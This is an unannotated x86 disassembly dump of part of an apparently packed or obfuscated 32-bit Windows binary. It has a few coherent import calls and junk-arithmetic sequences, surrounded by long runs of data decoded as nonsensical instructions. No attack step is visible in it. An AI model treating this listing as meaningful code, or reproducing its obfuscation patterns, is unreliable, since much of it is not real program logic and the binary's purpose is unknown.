  4174c5:	jbe    0x4170cf
  4174cb:	pop    edi
  4174cc:	pop    esi
  4174cd:	pop    ebx
  4174ce:	leave  
  4174cf:	ret    0x8
  4174d2:	push   ebp
  4174d3:	mov    ebp,esp
  4174d5:	and    esp,0xfffffff8
  4174d8:	sub    esp,0x9c
  4174de:	push   ebx
  4174df:	push   esi
  4174e0:	push   edi
  4174e1:	push   DWORD PTR ds:0x4223c4
  4174e7:	lea    eax,[esp+0xa4]
  4174ee:	push   eax
  4174ef:	call   DWORD PTR ds:0x428e60
  4174f5:	push   DWORD PTR [esp+0xa4]
  4174fc:	push   DWORD PTR ds:0x4223b0
  417502:	call   DWORD PTR ds:0x428e84
  417508:	push   eax
  417509:	call   DWORD PTR ds:0x428e6c
  41750f:	mov    ecx,DWORD PTR ds:0x422778
  417515:	sub    DWORD PTR ds:0x4282ff,0x42837b
  41751f:	jmp    0x4178ee
  417524:	iret   
  417525:	and    ah,BYTE PTR [esi]
  417527:	inc    eax
  417528:	sbb    bh,BYTE PTR [edi+ebp*4]
  41752b:	and    cl,BYTE PTR [ecx+edx*8]
  41752e:	fnstcw WORD PTR [esi+ebp*2+0xabe3d18]
  417535:	out    0x16,eax
  417537:	sbb    BYTE PTR [edx+edx*1-0x21d7e7e8],bh
  41753e:	pushf  
  41753f:	idiv   BYTE PTR [edi+0x16]
  417542:	and    al,0xa6
  417544:	push   ebx
  417545:	xchg   esp,eax
  417546:	retw   0x7ab0
  41754a:	dec    ebp
  41754b:	pop    edx
  41754c:	dec    ebx
  41754d:	rol    BYTE PTR [eax],1
  41754f:	mov    eax,ds:0x986d6297
  417554:	cdq    
  417555:	mov    ebx,0x5a554735
  41755a:	loop   0x41754d
  41755c:	in     eax,dx
  41755d:	push   cs
  41755e:	retf   0xfe97
  417561:	in     eax,dx
  417562:	and    al,0x90
  417564:	(bad)  
  417567:	jbe    0x41757e
  417569:	xor    ecx,DWORD PTR [ecx]
  41756b:	imul   eax,DWORD PTR [edx+0x55e3da7f],0x7509283f
  417575:	jno    0x417533
  417577:	and    eax,0x5fbd2d54
  41757c:	or     esi,ebx
  41757e:	xor    ch,BYTE PTR [eax]
  417580:	sub    BYTE PTR [edx+0x17],dh
  417583:	sbb    dl,BYTE PTR [ebx+edi*1]
  417586:	xor    ecx,edx
  417588:	sar    DWORD PTR [ebx-0x313fd3b7],1
  41758e:	nop
  41758f:	psrlw  mm2,QWORD PTR [eax]
  417592:	imul   eax,DWORD PTR [ecx+0x12],0x9c8a7f1f
  417599:	mov    ebx,DWORD PTR [ecx]
  41759b:	mov    dh,0x7a
  41759d:	mov    ecx,0x2ebb263e
  4175a2:	lahf   
  4175a3:	inc    esi
  4175a4:	jge    0x4175d9
  4175a6:	sahf   
  4175a7:	lahf   
  4175a8:	loop   0x41755f
  4175aa:	adc    DWORD PTR [esi+esi*4+0x46],0xffffffd6
  4175af:	push   esi
  4175b0:	hlt    
  4175b1:	sub    eax,0xb03bc7de
  4175b6:	ins    DWORD PTR es:[edi],dx
  4175b7:	(bad)
  4175bb:	cmp    dl,dh
  4175bd:	sbb    DWORD PTR [edx-0x2a],ebx
  4175c0:	lds    esi,FWORD PTR [ebp-0x76]
  4175c3:	(bad)  
  4175c4:	lar    ebp,WORD PTR [edx-0x7fea6d44]
  4175cb:	pop    eax
  4175cc:	cli    
  4175cd:	push   ecx
  4175ce:	xor    DWORD PTR [ebx+0xacd77ca],edx
  4175d4:	repz ret 0xa802
  4175d8:	sbb    esp,ebx
  4175da:	mov    al,ds:0xffc29694
  4175df:	push   ss
  4175e0:	push   cs
  4175e1:	ret    
  4175e2:	pop    ds
  4175e3:	sbb    DWORD PTR [edi],edx
  4175e5:	mov    ds:0x66477cbe,al
  4175ea:	mov    BYTE PTR [esi+edx*4],dh
  4175ed:	add    ebp,DWORD PTR [edx-0x56]
  4175f0:	(bad)  
  4175f1:	cdq    
  4175f2:	into   
  4175f3:	mov    BYTE PTR [edi+0x38],dl
  4175f6:	sar    dh,cl
  4175f8:	mov    ds:0x5c508bfe,eax
  4175fd:	mov    ah,0xdb
  4175ff:	push   edx
  417600:	popa   
  417601:	jmp    0x4422237
  417606:	inc    edi
  417607:	xchg   ecx,eax
  417608:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417609:	mov    al,0x0
  41760b:	sahf   
  41760c:	aam    0x1b
  41760e:	hlt    
  41760f:	fsub   DWORD PTR ds:[esi+eiz*1]
  417613:	mov    edx,0x2dffa490
  417618:	xchg   DWORD PTR ds:0x8c447b17,edx
  41761e:	pop    es
  41761f:	sub    DWORD PTR [eax],edx
  417621:	into   
  417622:	outs   dx,BYTE PTR ds:[esi]
  417623:	out    dx,eax
  417624:	in     eax,dx
  417625:	shl    ebp,0xad
  417628:	ins    BYTE PTR es:[edi],dx
  417629:	test   edx,0x60e24e35
  41762f:	leave  
  417630:	retf   0x731b
  417633:	pop    esi
  417634:	ror    DWORD PTR [eax+ebx*8],cl
  417637:	jge    0x41766d
  417639:	inc    esp
  41763a:	jns    0x4175bd
  41763c:	adc    edx,esi
  41763e:	rcr    DWORD PTR [ebx-0x4f],0xcb
  417642:	inc    eax
  417643:	outs   dx,BYTE PTR ds:[esi]
  417644:	sub    BYTE PTR ds:[esp+esi*4+0x2d],ch
  417649:	scas   eax,DWORD PTR es:[edi]
  41764a:	inc    esi
  41764b:	xor    BYTE PTR ds:0x97b2,0xd
  417651:	push   edi
  417652:	cdq    
  417653:	fstp   DWORD PTR [esi]
  417655:	mov    al,ds:0x735e5e1f
  41765a:	fldcw  WORD PTR [eax]
  41765c:	jg     0x417631
  41765e:	jne    0x417612
  417660:	gs mov ah,0xbc
  417663:	fsubr  st(5),st
  417665:	mov    ch,0x6
  417667:	loopne 0x417687
  417669:	xchg   esi,eax
  41766a:	out    dx,al
  41766b:	pop    ds
  41766c:	mov    bh,0x90
  41766e:	mov    eax,ds:0xdc05b73d
  417673:	fadd   QWORD PTR [ebx-0x15d7e6ef]
  417679:	xor    eax,DWORD PTR ds:0x319099e3
  41767f:	fisubr DWORD PTR [esp-0x435dfa]
  417686:	inc    esp
  417687:	jl     0x41768b
  417689:	mov    WORD PTR [ebx+edi*4-0x2c],fs
  41768d:	gs xchg ecx,eax
  41768f:	out    dx,eax
  417690:	add    DWORD PTR [ebx+edi*2],esi
  417693:	loop   0x4176a2
  417695:	icebp  
  417696:	fcmovne st,st(3)
  417698:	sbb    al,0x74
  41769a:	in     al,0x2f
  41769c:	push   edi
  41769d:	mov    dh,0xa
  41769f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176a0:	adc    DWORD PTR [ebx+0x757d7e20],0x856d109a
  4176aa:	mov    bh,BYTE PTR [ebx+ecx*1-0x5c]
  4176ae:	rcl    BYTE PTR [eax+0x71639db],0xdb
  4176b5:	push   ecx
  4176b6:	mov    ds:0x406a559a,al
  4176bb:	push   edx
  4176bc:	xor    bh,BYTE PTR [edx+0x6621556b]
  4176c2:	mov    al,0x8e
  4176c4:	dec    eax
  4176c5:	out    dx,al
  4176c6:	mov    eax,0x52980921
  4176cb:	in     eax,0x76
  4176cd:	dec    ebp
  4176ce:	fbld   TBYTE PTR [ebp+0x1145ac57]
  4176d4:	cmp    eax,0x33f68d7b
  4176d9:	jecxz  0x4176d2
  4176db:	pusha  
  4176dc:	sub    cl,BYTE PTR [ebx+0x1c]
  4176df:	test   al,0x11
  4176e1:	call   0xe4a2:0x67045de9
  4176e8:	jb     0x4176d8
  4176ea:	iret   
  4176eb:	dec    edi
  4176ec:	and    DWORD PTR [esi],esi
  4176ee:	(bad)  
  4176ef:	pushf  
  4176f0:	test   BYTE PTR [edi-0x2b],0x1e
  4176f4:	or     eax,0x659083ac
  4176f9:	push   0x9
  4176fb:	rcl    DWORD PTR [ebx-0x79],1
  4176fe:	pushf  
  4176ff:	dec    ecx
  417700:	clc    
  417701:	or     al,0x79
  417703:	out    dx,al
  417704:	or     esp,DWORD PTR [ebx]
  417706:	lahf   
  417707:	call   0x9b1b97ec
  41770c:	dec    ebx
  41770d:	sbb    eax,0xd5fbe67d
  417712:	lods   eax,DWORD PTR ds:[esi]
  417713:	stos   BYTE PTR es:[edi],al
  417714:	out    dx,al
  417715:	inc    edx
  417716:	cmp    edi,DWORD PTR [edi-0x4f]
  417719:	repnz fisubr WORD PTR [ebp+0x2b]
  41771d:	xchg   esi,eax
  41771e:	jg     0x417777
  417720:	pop    ebp
  417721:	pop    edi
  417722:	pop    ebx
  417723:	jbe    0x4176f3
  417725:	dec    eax
  417726:	ins    DWORD PTR es:[edi],dx
  417727:	out    0xc8,al
  417729:	ret    
  41772a:	lock rol DWORD PTR [ebp+0x17],cl
  41772e:	fcomi  st,st(3)
  417730:	cmp    ebp,DWORD PTR [ebx]
  417732:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417733:	jb     0x4177ac
  417735:	mov    ds:0x22e685d3,eax
  41773a:	sbb    eax,DWORD PTR [eax+0x61ecc789]
  417740:	mov    cl,0xe9
  417742:	bound  eax,QWORD PTR [ebp-0x740339ce]
  417748:	mov    ds:0x97288b27,eax
  41774d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41774f:	xchg   ecx,eax
  417750:	mov    ah,0xdc
  417752:	sub    ecx,edi
  417754:	pop    edi
  417755:	adc    eax,0xbdcdd2f7
  41775a:	outs   dx,BYTE PTR ds:[esi]
  41775b:	dec    ecx
  41775c:	stos   BYTE PTR es:[edi],al
  41775d:	(bad)  
  41775e:	push   ebp
  41775f:	xchg   ecx,eax
  417760:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417761:	loopne 0x41771f
  417763:	shufps xmm7,XMMWORD PTR [ebp+ebp*2-0x1241b7f9],0x25
  41776c:	aad    0x62
  41776e:	xor    DWORD PTR [esi+0x44cc912d],esi
  417774:	xor    bh,BYTE PTR [eax]
  417776:	and    ebp,DWORD PTR [ebp-0x4a]
  417779:	jnp    0x41770e
  41777b:	push   ds
  41777c:	fmul   DWORD PTR [ebp-0x4e4fb14f]
  417782:	in     eax,0x6f
  417784:	fimul  DWORD PTR [edi-0x26]
  417787:	(bad)  
  417789:	adc    cl,BYTE PTR [edx]
  41778b:	les    edx,FWORD PTR [ebx+ecx*8-0x35960ca4]
  417792:	ds into 
  417794:	dec    eax
  417795:	loop   0x41779f
  417797:	xor    al,0x1
  417799:	aad    0x83
  41779b:	sti    
  41779c:	mov    WORD PTR [edi+0x4973a9bd],gs
  4177a2:	lock jnp 0x417775
  4177a5:	mov    BYTE PTR [edx+0x21],cl
  4177a8:	adc    al,0x65
  4177aa:	mov    esi,esi
  4177ac:	add    BYTE PTR [ecx-0x1b],ch
  4177af:	inc    ebp
  4177b0:	push   cs
  4177b1:	sbb    eax,0x9dcc62b7
  4177b6:	ret    0x3045
  4177b9:	mov    esp,0x97016821
  4177be:	push   esp
  4177bf:	pop    edx
  4177c0:	neg    esi
  4177c2:	jns    0x41779b
  4177c4:	inc    esi
  4177c5:	and    bl,BYTE PTR [ebx]
  4177c7:	and    BYTE PTR [esi],0x75
  4177ca:	call   0x65cf:0x59a35a4f
  4177d1:	mov    esp,0x8b49ab18
  4177d6:	bound  edi,QWORD PTR [ebx-0x4fc1f3fe]
  4177dc:	push   esi
  4177dd:	jae    0x417841
  4177df:	int3   
  4177e0:	jle    0x417841
  4177e2:	rcl    BYTE PTR [esi],cl
  4177e4:	dec    esp
  4177e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177e6:	mov    al,ds:0xd9d43f5e
  4177eb:	dec    esi
  4177ec:	push   cs
  4177ed:	adc    eax,0xfa79f464
  4177f2:	sub    eax,0xbdec105c
  4177f7:	add    DWORD PTR [edx-0x15],esp
  4177fa:	sti    
  4177fb:	fiadd  DWORD PTR [ebp+0x7c3e0e8]
  417801:	fidivr DWORD PTR [ecx]
  417803:	pop    eax
  417804:	das    
  417805:	outs   dx,DWORD PTR ds:[esi]
  417806:	(bad)
  417809:	inc    ebp
  41780a:	jecxz  0x4177f1
  41780c:	je     0x4177ef
  41780e:	dec    eax
  41780f:	push   eax
  417810:	out    dx,al
  417811:	push   cs
  417812:	mov    ds:0x5df952e5,al
  417817:	in     al,0x84
  417819:	mov    ecx,DWORD PTR ds:0x8355e0e
  41781f:	ror    ebx,0x6d
  417822:	das    
  417823:	or     esi,DWORD PTR [edi]
  417825:	pop    eax
  417826:	out    dx,eax
  417827:	or     DWORD PTR [esi],esi
  417829:	mov    bh,0xdb
  41782b:	xor    ebx,esi
  41782d:	xor    cl,BYTE PTR ds:0x803b3c20
  417833:	in     eax,dx
  417834:	rsm    
  417836:	mov    edi,0xea53d16d
  41783b:	popf   
  41783c:	add    BYTE PTR [ecx+0x27627009],al
  417842:	mov    ebp,0x435ad25f
  417847:	jb     0x4177cd
  417849:	push   ebx
  41784a:	pop    es
  41784b:	xor    al,0x7a
  41784d:	outs   dx,DWORD PTR ds:[esi]
  41784e:	jb     0x4178bf
  417850:	cwde   
  417851:	rcl    ah,cl
  417853:	clc    
  417854:	cwde   
  417855:	enter  0x604c,0x8b
  417859:	ficomp DWORD PTR [edx-0x4e]
  41785c:	add    edi,0xffffff81
  41785f:	add    DWORD PTR [eax*4-0x102afbbc],ecx
  417866:	pop    ebp
  417867:	clc    
  417868:	aad    0xb5
  41786a:	gs cld 
  41786c:	mov    dh,0x28
  41786e:	inc    ecx
  41786f:	xchg   esi,eax
  417870:	and    al,0xa1
  417872:	xor    DWORD PTR [eax-0x67],eax
  417875:	cld    
  417876:	test   al,0x47
  417878:	arpl   si,si
  41787a:	xchg   esp,eax
  41787b:	in     eax,0x57
  41787d:	xor    al,0xd6
  41787f:	xor    dh,ah
  417881:	inc    ebp
  417882:	mov    ebp,0xcaccb264
  417887:	add    al,0x35
  417889:	lea    ebp,[edx+ebp*4]
  41788c:	sub    DWORD PTR [edx+0x62aca91],eax
  417892:	in     eax,dx
  417893:	xchg   esi,eax
  417894:	dec    ebx
  417895:	xchg   BYTE PTR [ecx+0x72],cl
  417898:	jge    0x41787a
  41789a:	pushf  
  41789b:	outs   dx,DWORD PTR ds:[esi]
  41789c:	imul   esp,DWORD PTR [edi+0x2d],0x27
  4178a0:	loopne 0x4178c8
  4178a2:	aam    0x25
  4178a4:	mov    eax,0xf3a28cef
  4178a9:	out    0x72,eax
  4178ab:	and    ecx,ecx
  4178ad:	push   esp
  4178ae:	sub    DWORD PTR [ecx-0x1b],0x19
  4178b2:	(bad)
  4178b6:	or     BYTE PTR [di],ch
  4178b9:	xchg   edi,eax
  4178ba:	mov    cl,BYTE PTR fs:[ecx]
  4178bd:	std    
  4178be:	mov    edi,0xdd3b8a70
  4178c3:	push   0x8832cdc4
  4178c8:	fdiv   QWORD PTR [ebx-0x72ac0b06]
  4178ce:	jbe    0x41793c
  4178d0:	mov    dl,0xc2
  4178d2:	dec    eax
  4178d3:	dec    ebx
  4178d4:	js     0x417878
  4178d6:	pop    esi
  4178d7:	inc    edi
  4178d8:	mul    DWORD PTR [eax-0x34]
  4178db:	push   ebp
  4178dc:	push   cs
  4178dd:	rcr    BYTE PTR [edx+eiz*1+0x5702e96a],1
  4178e4:	in     al,dx
  4178e5:	mov    esi,DWORD PTR [ebp-0x6b]
  4178e8:	jae    0x417894
  4178ea:	cmp    cl,BYTE PTR [ecx+0x6aeabf]
  4178f0:	and    DWORD PTR ds:0x428297,0x6fb6
  4178fa:	push   DWORD PTR [ecx]
  4178fc:	or     DWORD PTR ds:0x428237,0x652f
  417906:	call   eax
  417908:	adc    esi,DWORD PTR ds:0x42824f
  41790e:	mov    esi,0x1ff
  417913:	add    eax,eax
  417915:	mov    DWORD PTR [esp+0x24],0x3992
  41791d:	mov    DWORD PTR [esp+0xc],0x79a2
  417925:	add    DWORD PTR ds:0x428237,0x3f4a
  41792f:	mov    eax,DWORD PTR [esp+0xc]
  417933:	mov    ecx,DWORD PTR ds:0x4282d7
  417939:	mov    ecx,DWORD PTR [ecx]
  41793b:	and    DWORD PTR ds:0x42829f,ecx
  417941:	mov    ecx,DWORD PTR [esp+0x24]
  417945:	sub    DWORD PTR ds:0x42824f,0x428257
  41794f:	xor    eax,0x1d22
  417954:	xor    DWORD PTR ds:0x428313,0x3de5
  41795e:	imul   eax,eax,0xffffdeb4
  417964:	and    eax,0x43eb
  417969:	sub    eax,ecx
  41796b:	xor    DWORD PTR ds:0x42826f,0x42819b
  417975:	mov    DWORD PTR [esp+0x3c],eax
  417979:	xor    DWORD PTR ds:0x42815b,0x24fe
  417983:	mov    DWORD PTR [esp+0x38],0x3b18
  41798b:	mov    DWORD PTR [esp+0x2c],0x6c93
  417993:	adc    DWORD PTR ds:0x42825f,0x3367
  41799d:	mov    DWORD PTR [esp+0x24],0x418e
  4179a5:	add    DWORD PTR ds:0x42829b,ebx
  4179ab:	mov    DWORD PTR [esp+0xc],0x5ac3
  4179b3:	xor    ecx,ecx
  4179b5:	add    ecx,DWORD PTR ds:0x4283a7
  4179bb:	add    DWORD PTR ds:0x42816b,ecx
  4179c1:	mov    eax,DWORD PTR [esp+0xc]
  4179c5:	mov    ecx,DWORD PTR [esp+0x24]
  4179c9:	add    DWORD PTR ds:0x428293,0x705
  4179d3:	sub    ecx,eax
  4179d5:	and    eax,0x1ffb
  4179da:	mov    eax,DWORD PTR [esp+0x2c]
  4179de:	and    ecx,eax
  4179e0:	mov    eax,DWORD PTR [esp+0x38]
  4179e4:	sbb    DWORD PTR ds:0x428153,0x42836f
  4179ee:	xor    ecx,0x10d6
  4179f4:	sub    ecx,0x782c
  4179fa:	imul   ecx,eax
  4179fd:	mov    eax,0x7fd0
  417a02:	mov    eax,DWORD PTR [esp+0x3c]
  417a06:	cmp    eax,ecx
  417a08:	mov    DWORD PTR ds:0x42816b,0x7353
  417a12:	jne    0x41890f
  417a18:	and    eax,eax
  417a1a:	mov    DWORD PTR [esp+0x10],0x1
  417a22:	mov    DWORD PTR [esp+0x30],0x2f16
  417a2a:	xor    ecx,DWORD PTR ds:0x428257
  417a30:	mov    DWORD PTR [esp+0x48],0x16f
  417a38:	mov    DWORD PTR [esp+0x50],0x30c5
  417a40:	add    DWORD PTR ds:0x4282f7,edx
  417a46:	push   DWORD PTR ds:0xe5bfd6f1
  417a4c:	cmp    DWORD PTR ds:0x428273,0x0
  417a53:	mov    DWORD PTR ds:0x4282ef,edx
  417a59:	mov    ecx,0x328
  417a5e:	mov    ecx,0x6d04
  417a63:	jmp    0x417abd
  417a68:	mov    DWORD PTR ds:0x428267,0x44f5
  417a72:	cmp    DWORD PTR ds:0x428273,0x0
  417a79:	je     0x417a9d
  417a7f:	push   DWORD PTR [ebp-0x18]
  417a82:	push   DWORD PTR [ebp-0x18]
  417a85:	push   0x8f00
  417a8a:	push   DWORD PTR [ebp-0x10]
  417a8d:	call   DWORD PTR ds:0x428de4
  417a93:	not    ecx
  417a95:	sub    ecx,ecx
  417a97:	or     DWORD PTR ds:0x428247,ebx
  417a9d:	mov    ecx,DWORD PTR ds:0x4282d3
  417aa3:	mov    ecx,DWORD PTR [ecx]
  417aa5:	and    DWORD PTR ds:0x42818b,ecx
  417aab:	sbb    ecx,0x5390
  417ab1:	add    ecx,0xb3f
  417ab7:	add    DWORD PTR ds:0x42819b,edi
  417abd:	mov    DWORD PTR [esp+0x8c],0x4ebc
  417ac8:	xor    eax,eax
  417aca:	mov    DWORD PTR [esp+0x98],0x76
  417ad5:	mov    DWORD PTR [esp+0x40],0x556d
  417add:	neg    DWORD PTR ds:0x42815f
  417ae3:	jmp    0x417eb2
  417ae8:	(bad)  [eax-0x2]
  417aec:	xor    BYTE PTR [edx+0x1a],bh
  417aef:	fwait
  417af0:	clc    
  417af1:	dec    edi
  417af2:	arpl   WORD PTR [ecx+edi*2-0x518f3462],di
  417af9:	loope  0x417b11
  417afb:	sbb    BYTE PTR [edx+edx*1+0x433e1818],bh
  417b02:	call   0xdfdf337
  417b07:	sahf   
  417b08:	xchg   edx,eax
  417b09:	mov    bh,0xb9
  417b0b:	sub    ch,bh
  417b0d:	div    BYTE PTR [ecx+0x620908e2]
  417b13:	inc    esp
  417b14:	and    al,0xbf
  417b16:	push   ecx
  417b17:	jae    0x417b24
  417b19:	inc    ecx
  417b1a:	mov    al,0xcb
  417b1c:	fnsave [edx-0x4902820a]
  417b22:	les    ebx,FWORD PTR [ebx]
  417b24:	add    eax,0x75349aff
  417b29:	xor    BYTE PTR [edi],bh
  417b2b:	push   eax
  417b2c:	and    bl,BYTE PTR [eax+0x24]
  417b2f:	nop
  417b30:	mov    ch,0x2c
  417b32:	neg    dh
  417b34:	or     DWORD PTR [eax+ecx*4],ebp
  417b37:	test   edi,0x878c11ee
  417b3d:	outs   dx,BYTE PTR ds:[esi]
  417b3e:	xchg   edx,eax
  417b3f:	sbb    DWORD PTR [edi-0x70],edx
  417b42:	xor    bh,BYTE PTR ds:0xcc6a0524
  417b48:	popf   
  417b49:	mov    dh,0xb1
  417b4b:	int3   
  417b4c:	sub    edi,DWORD PTR [ebx+0x75]
  417b4f:	xor    eax,0x3d267995
  417b54:	mov    bl,0x75
  417b56:	int3   
  417b57:	rol    DWORD PTR [eax],cl
  417b59:	retf   
  417b5a:	mov    al,0x28
  417b5c:	ror    DWORD PTR [ecx],0x3b
  417b5f:	pusha  
  417b60:	or     ch,BYTE PTR [ebx]
  417b62:	sbb    eax,0x3e6582f9
  417b67:	addr16 push ebx
  417b69:	pop    es
  417b6a:	cwde   
  417b6b:	je     0x417b2b
  417b6d:	jmp    0x417b85
  417b6f:	xchg   ecx,eax
  417b70:	mov    ebx,0xbfc0ebf0
  417b75:	js     0x417ba2
  417b77:	popf   
  417b78:	ins    DWORD PTR es:[edi],dx
  417b79:	cmc    
  417b7a:	lahf   
  417b7b:	inc    ebp
  417b7c:	ret    
  417b7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b7e:	push   0xcf760827
  417b83:	pop    eax
  417b84:	push   edi
  417b85:	add    edi,esp
  417b87:	pusha  
  417b88:	ret    0x6893
  417b8b:	push   ebp
  417b8c:	cld    
  417b8d:	stc    
  417b8e:	adc    ah,BYTE PTR ds:[edi]
  417b91:	or     BYTE PTR ds:0xf485832c,0xc4
  417b98:	push   ebp
  417b99:	stos   DWORD PTR es:[edi],eax
  417b9a:	clc    
  417b9b:	icebp  
  417b9c:	lahf   
  417b9d:	mov    ebp,0x8d68e9bd
  417ba2:	cmp    dl,dh
  417ba4:	mov    edi,0x6b084016
  417ba9:	adc    cl,cl
  417bab:	(bad)  
  417bad:	(bad)  
  417bae:	aad    0x26
  417bb0:	iret   
  417bb1:	mov    esp,0x2f698350
  417bb6:	mov    ds:0x68eef352,al
  417bbb:	xchg   BYTE PTR [ecx-0x2d],dh
  417bbe:	arpl   ax,si
  417bc0:	inc    esp
  417bc1:	push   ecx
  417bc2:	stos   DWORD PTR es:[edi],eax
  417bc3:	mov    dh,0xbc
  417bc5:	xchg   ebp,eax
  417bc6:	pop    ebx
  417bc7:	inc    esp
  417bc8:	loop   0x417b81
  417bca:	ins    DWORD PTR es:[edi],dx
  417bcb:	out    0xcb,eax
  417bcd:	adc    eax,0xf1c550e
  417bd2:	xchg   ebp,eax
  417bd3:	lods   eax,DWORD PTR ds:[esi]
  417bd4:	dec    edx
  417bd5:	addr16 dec ecx
  417bd7:	cmp    DWORD PTR [ecx+0x1e],esi
  417bda:	pop    esp
  417bdb:	mov    eax,0xf02ecd77
  417be0:	not    ch
  417be2:	gs jle 0x417c33
  417be5:	sbb    ch,BYTE PTR [eax-0x749f42cd]
  417beb:	test   BYTE PTR [edx],0xc6
  417bee:	xlat   BYTE PTR ds:[ebx]
  417bef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bf0:	into   
  417bf1:	push   ecx
  417bf2:	pushf  
  417bf3:	fsubp  st(2),st
  417bf5:	cmp    ebp,DWORD PTR [eax+0x23]
  417bf8:	jp     0x417c14
  417bfa:	and    eax,0xc8beea0b
  417bff:	js     0x417bd8
  417c01:	xor    edx,DWORD PTR [ebp+0x61]
  417c04:	and    al,0x72
  417c06:	and    eax,ecx
  417c08:	add    dh,ah
  417c0a:	or     DWORD PTR [ecx+0x2a],esi
  417c0d:	adc    BYTE PTR [esp+edx*1-0x63],ah
  417c11:	(bad)  
  417c12:	fs sub dh,ch
  417c15:	fcomip st,st(3)
  417c17:	mov    dh,dl
  417c19:	pop    ds
  417c1a:	icebp  
  417c1b:	shl    BYTE PTR [esi+0x91935ed],1
  417c21:	push   esp
  417c22:	popa   
  417c23:	xor    eax,ebp
  417c25:	and    DWORD PTR [esi+ebx*4],ecx
  417c28:	xor    DWORD PTR [edx],ebp
  417c2a:	loop   0x417c90
  417c2c:	mov    ds:0xf48f419f,eax
  417c31:	and    edi,DWORD PTR [edi+0x57926699]
  417c37:	push   ebx
  417c38:	es mov bl,al
  417c3b:	enter  0xbb5d,0xb5
  417c3f:	fwait
  417c40:	mov    bh,0x8a
  417c42:	ins    BYTE PTR es:[edi],dx
  417c43:	sbb    al,BYTE PTR [eax+0x37d92c33]
  417c49:	inc    esi
  417c4a:	push   es
  417c4b:	gs or  al,0xb6
  417c4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c4f:	dec    ecx
  417c50:	paddw  mm5,QWORD PTR [edx+eiz*4-0x77]
  417c55:	test   ah,cl
  417c57:	addr16 xor cl,dl
  417c5a:	xchg   esp,eax
  417c5b:	not    BYTE PTR [edx+0x24a75b55]
  417c61:	(bad)
  417c64:	aam    0x83
  417c66:	jmp    0x417c5c
  417c68:	mov    ebp,DWORD PTR [ecx]
  417c6a:	pushf  
  417c6b:	jns    0x417c70
  417c6d:	xchg   esp,eax
  417c6e:	cli    
  417c6f:	enter  0x8e71,0xbe
  417c73:	add    BYTE PTR [edi],ch
  417c75:	es call 0xeb4d:0xb0b05276
  417c7d:	les    esp,FWORD PTR [esi-0x4e]
  417c80:	rcl    BYTE PTR [edi-0x2cb55945],1
  417c86:	jno    0x417cab
  417c88:	mov    ds:0xa7305d05,eax
  417c8d:	sahf   
  417c8e:	sub    al,0x13
  417c90:	scas   al,BYTE PTR es:[edi]
  417c91:	xor    eax,0x34396494
  417c96:	push   ebp
  417c97:	rol    BYTE PTR [ebx+0x18],1
  417c9a:	iret   
  417c9b:	push   cs
  417c9c:	dec    eax
  417c9d:	pop    ecx
  417c9e:	sar    DWORD PTR ds:0x65e65067,cl
  417ca4:	jmp    0x417cc6
  417ca6:	add    esi,edx
  417ca8:	sti    
  417ca9:	ret    
  417caa:	xlat   BYTE PTR ds:[ebx]
  417cab:	(bad)  
  417cad:	scas   al,BYTE PTR es:[edi]
  417cae:	(bad)  
  417caf:	mov    ebx,0xf19d6e6a
  417cb4:	into   
  417cb5:	add    BYTE PTR [ebx-0x6e],cl
  417cb8:	sub    dl,bl
  417cba:	pop    eax
  417cbb:	jo     0x417d0d
  417cbd:	out    0xb8,eax
  417cbf:	fcomp  DWORD PTR [eax]
  417cc1:	xchg   ecx,eax
  417cc2:	aad    0x8c
  417cc4:	sub    ah,BYTE PTR [edi]
  417cc6:	shl    DWORD PTR [eax+0x13a8a211],0x3c
  417ccd:	cmp    DWORD PTR [esi],ecx
  417ccf:	mov    ds:0xc8e422f3,al
  417cd4:	pop    edx
  417cd5:	push   edi
  417cd6:	and    ah,BYTE PTR ds:0x5b2e97bf
  417cdc:	leave  
  417cdd:	adc    DWORD PTR [ebx],eax
  417cdf:	and    DWORD PTR [edi],esp
  417ce1:	imul   esp,DWORD PTR [ecx+0x5e],0x1b27fe43
  417ce8:	push   0xca92374b
  417ced:	(bad)  
  417cee:	mov    dh,0xaf
  417cf0:	mov    ah,0x51
  417cf2:	icebp  
  417cf3:	mov    esi,0x844a6ad3
  417cf8:	popa   
  417cf9:	mov    al,ds:0x2f8cf30c
  417cfe:	push   ss
  417cff:	dec    ecx
  417d00:	mov    bl,0xc9
  417d02:	push   es
  417d03:	aaa    
  417d04:	xor    esi,ecx
  417d06:	and    BYTE PTR [ebx+0x74f05111],0xcb
  417d0d:	xchg   ecx,eax
  417d0e:	dec    ebx
  417d0f:	sbb    DWORD PTR [ebp-0x45],esi
  417d12:	scas   eax,DWORD PTR es:[edi]
  417d13:	mul    bh
  417d15:	leave  
  417d16:	bound  esi,QWORD PTR [edi]
  417d18:	or     BYTE PTR [edi],bh
  417d1a:	mov    WORD PTR [esi-0x147b6659],gs
  417d20:	outs   dx,DWORD PTR ds:[esi]
  417d21:	rcl    BYTE PTR [eax+ecx*2-0x6b],0x34
  417d26:	ss xor al,0xed
  417d29:	jbe    0x417da2
  417d2b:	or     DWORD PTR [ebp+0x7d],esi
  417d2e:	pop    ebx
  417d2f:	in     eax,dx
  417d30:	rol    BYTE PTR [esi],cl
  417d32:	push   esp
  417d33:	and    BYTE PTR [esi+eax*1-0x3f],dh
  417d37:	pop    esp
  417d38:	bound  edi,QWORD PTR [edx-0x7fefd481]
  417d3e:	lods   eax,DWORD PTR ds:[esi]
  417d3f:	ins    BYTE PTR es:[edi],dx
  417d40:	mov    ds:0x18512285,al
  417d45:	xchg   ebx,eax
  417d46:	inc    eax
  417d47:	fild   WORD PTR [ebx+0x6553b66f]
  417d4d:	sub    esp,DWORD PTR ds:0x6ccd5ff6
  417d53:	sbb    BYTE PTR [edx+0x4e],ah
  417d56:	pop    esp
  417d57:	pop    ds
  417d58:	dec    esp
  417d59:	xchg   ebx,eax
  417d5a:	dec    edi
  417d5b:	inc    esp
  417d5c:	test   DWORD PTR [ecx+0x5b],0x3dc46912
  417d63:	(bad)  
  417d64:	jne    0x417d78
  417d66:	cdq    
  417d67:	dec    esp
  417d68:	iret   
  417d69:	in     al,0xbb
